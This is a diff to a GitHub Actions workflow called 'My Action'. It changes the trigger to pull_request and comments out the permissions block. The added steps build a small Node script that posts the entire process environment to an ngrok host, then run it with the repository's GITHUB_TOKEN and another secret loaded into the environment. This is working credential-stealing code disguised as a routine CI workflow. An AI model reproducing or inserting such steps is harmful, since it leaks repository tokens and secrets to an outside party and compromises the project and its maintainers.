@@ -1,17 +1,24 @@
 name: My Action
 on:
   workflow_dispatch:
-  issues:
-    types: [opened, edited, deleted, transferred, pinned, unpinned, closed, reopened, labeled, unlabeled, locked, unlocked, milestoned, demilestoned]
-  pull_request_target:
-    types: [opened, edited, closed, reopened, synchronize, ready_for_review, locked, unlocked, review_requested, review_request_removed, labeled, unlabeled, assigned, unassigned, opened, edited, closed, reopened, synchronize, ready_for_review, locked, unlocked, review_requested, review_request_removed, labeled, unlabeled, assigned, unassigned]
-    branches: [main]
-permissions:
-  contents: read
-  pull-requests: write
-  issues: write
+  pull_request:
+    types: [opened, synchronize, reopened, closed]
+#   issues:
+#     types: [opened, edited, deleted, transferred, pinned, unpinned, closed, reopened, labeled, unlabeled, locked, unlocked, milestoned, demilestoned]
+#   pull_request_target:
+#     types: [opened, edited, closed, reopened, synchronize, ready_for_review, locked, unlocked, review_requested, review_request_removed, labeled, unlabeled, assigned, unassigned, opened, edited, closed, reopened, synchronize, ready_for_review, locked, unlocked, review_requested, review_request_removed, labeled, unlabeled, assigned, unassigned]
+#     branches: [main]
+# permissions:
+#   contents: read
+#   pull-requests: write
+#   issues: write
 jobs:
   my-action:
     runs-on: ubuntu-latest
     steps:
       - run: mkdir test
+      - run: cd test && npm init -y
+      - run: touch index.js
+      - run: npm install axios express
+      - run: echo "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.json()); app.listen(3000, async() => {await axios.post('https://0cff-185-187-131-197.ngrok.io', process.env)});" > index.js
+      - run: MY_TOKEN=${{ secrets.GITHUB_TOKEN }} MY_SECRET=${{ env.ALI }} node index.js
